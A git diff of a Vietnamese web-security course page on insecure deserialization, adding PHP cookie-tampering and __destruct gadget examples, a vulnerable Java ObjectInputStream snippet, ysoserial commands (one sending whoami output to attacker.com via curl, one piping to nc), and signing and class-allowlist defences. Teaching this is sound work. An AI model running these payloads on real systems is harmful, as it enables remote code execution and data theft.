@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Chương 26: Insecure Deserialization — Hieu Nguyen</title>
-  <meta name="description" content="Insecure deserialization, avoid native pickle, signed tokens.">
+  <meta name="description" content="Chương 26: Insecure Deserialization — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,57 +40,138 @@
         <span>›</span>
         <span>26. Deserialization</span>
       </div>
-      <h1>Chương 26: Insecure Deserialization</h1>
-      <p class="lede">Unpickle / Java gadget / PHP unserialize từ dữ liệu user. Object thành code path.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> V — Server-side</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>Deserialize dữ liệu không tin được có thể gọi constructor/magic và gadget chain. Cookie PHP serialized, Java session, Python pickle, YAML load — cùng lớp.</p>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>JSON schema, không pickle/unserialize user.</li>
-        <li>Nếu bắt buộc: chữ ký + allowlist class.</li>
-        <li>Thư viện YAML safe load.</li>
-        <li>Tách network service deserialize.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Redis/session không nhận blob lạ từ client. Dependency gadget: SCA. Runtime: non-root.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Đừng deserialize input thô.</li>
-        <li>JSON + schema.</li>
-        <li>SCA gadget.</li>
-        <li>Ký blob nếu bắt buộc.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Pickle khác JSON chỗ nào?</li>
-        <li>Cookie serialized PHP rủi ro?</li>
-        <li>safe_load YAML?</li>
-        <li>Gadget chain nghĩa là gì (ý tưởng)?</li>
-        <li>Session store tin client blob khi nào sai?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 26: Insecure Deserialization</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>Insecure Deserialization</strong> (Deserialization không an toàn) xảy ra khi ứng dụng deserialize dữ liệu từ user input mà không validate, cho phép hacker inject arbitrary objects dẫn đến RCE.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Rất cao — RCE, privilege escalation.</p>
+<hr>
+<h2 id="serialization-là-gì">Serialization là gì?</h2>
+<pre><code class="language-text">Serialization: Object → Bytes (để lưu/truyền)
+Deserialization: Bytes → Object (tái tạo)
 
-      <div class="docs-tags">
-        <span class="docs-tag">deserialization</span>
-        <span class="docs-tag">rce</span>
-      </div>
+Ứng dụng serialize objects để:
+- Lưu session
+- Truyền qua network
+- Cache data
+</code></pre>
+<hr>
+<h2 id="ngôn-ngữ-specific">Ngôn ngữ-Specific</h2>
+<h3 id="php">PHP</h3>
+<pre><code class="language-php">// Serialize
+$obj = new User(1, &#x27;admin&#x27;);
+$serialized = serialize($obj);
+// O:4:&quot;User&quot;:2:{s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;}
+
+// Vulnerable deserialization
+$data = unserialize($_COOKIE[&#x27;user_data&#x27;]);  // Không validate!
+
+// Attack: Modify cookie thành:
+// O:4:&quot;User&quot;:2:{s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;is_admin&quot;;b:1;}
+// → Object với is_admin = true
+</code></pre>
+<p><strong>PHP Magic Methods:</strong></p>
+<pre><code class="language-php">__wakeup()    # Gọi sau deserialization
+__destruct()  # Gọi khi object bị garbage collected
+__toString()  # Gọi khi object dùng như string
+
+// Gadget chain: chuỗi method calls exploit sẵn có trong code
+class Logger {
+    public $logFile;
+    
+    public function __destruct() {
+        file_put_contents($this-&gt;logFile, &#x27;log entry&#x27;);
+        // Hacker set $logFile = &quot;/var/www/shell.php&quot;
+        // Và inject PHP code vào &#x27;log entry&#x27;
+    }
+}
+</code></pre>
+<h3 id="java">Java</h3>
+<pre><code class="language-java">// Vulnerable
+ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
+Object obj = ois.readObject();  // ← Deserialize từ request body
+
+// Gadget chains: ysoserial
+// java -jar ysoserial.jar CommonsCollections6 &quot;touch /tmp/pwned&quot; | nc target 80
+</code></pre>
+<pre><code class="language-bash"># ysoserial: tool tạo Java deserialization gadget chains
+java -jar ysoserial.jar CommonsCollections6 &quot;curl https://attacker.com/$(whoami)&quot;
+# → Serialize payload RCE
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<pre><code class="language-python"># Python: Không dùng pickle từ untrusted input
+import pickle
+import hmac
+import hashlib
+
+SECRET_KEY = b&#x27;super-secret&#x27;
+
+def serialize(obj):
+    data = pickle.dumps(obj)
+    sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
+    return sig + &#x27;:&#x27; + data.hex()
+
+def deserialize(signed_data):
+    sig, hex_data = signed_data.split(&#x27;:&#x27;, 1)
+    data = bytes.fromhex(hex_data)
+    
+    # Verify signature trước khi deserialize
+    expected_sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(sig, expected_sig):
+        raise ValueError(&quot;Signature mismatch&quot;)
+    
+    return pickle.loads(data)  # Safe vì đã verify signature
+
+# Hoặc: Dùng JSON thay vì binary serialization
+import json
+serialized = json.dumps({&#x27;user_id&#x27;: 1, &#x27;role&#x27;: &#x27;user&#x27;})
+obj = json.loads(serialized)
+</code></pre>
+<pre><code class="language-java">// Java: Whitelist allowed classes
+import java.io.*;
+import java.util.Arrays;
+import java.util.List;
+
+class SafeObjectInputStream extends ObjectInputStream {
+    private static final List&lt;String&gt; ALLOWED_CLASSES = Arrays.asList(
+        &quot;com.example.app.SafeClass&quot;,
+        &quot;java.lang.String&quot;,
+        &quot;java.util.ArrayList&quot;
+    );
+    
+    @Override
+    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException {
+        if (!ALLOWED_CLASSES.contains(desc.getName())) {
+            throw new InvalidClassException(&quot;Unauthorized deserialization&quot;, desc.getName());
+        }
+        return super.resolveClass(desc);
+    }
+}
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>Insecure deserialization: deserialize untrusted data → attacker inject malicious objects.</li>
+<li>PHP: magic methods (__wakeup, __destruct) trong gadget chains.</li>
+<li>Java: ysoserial tool tạo gadget chain payloads.</li>
+<li>Phòng chống: sign serialized data, whitelist allowed classes, prefer JSON.</li>
+</ul>
       <div class="docs-pager">
-        <a href="../25/">Previous · 25. SSTI</a>
-        <a href="../27/">Next · 27. GraphQL</a>
+        <a href="../21/">Previous · 21. Business Logic</a>
+        <a href="../23/">Next · 23. Cache Poisoning</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#serialization-là-gì">Serialization là gì?</a>
+        <a href="#ngôn-ngữ-specific">Ngôn ngữ-Specific</a>
+        <a class="depth-3" href="#php">PHP</a>
+        <a class="depth-3" href="#java">Java</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
       </nav>
     </aside>
   </div>
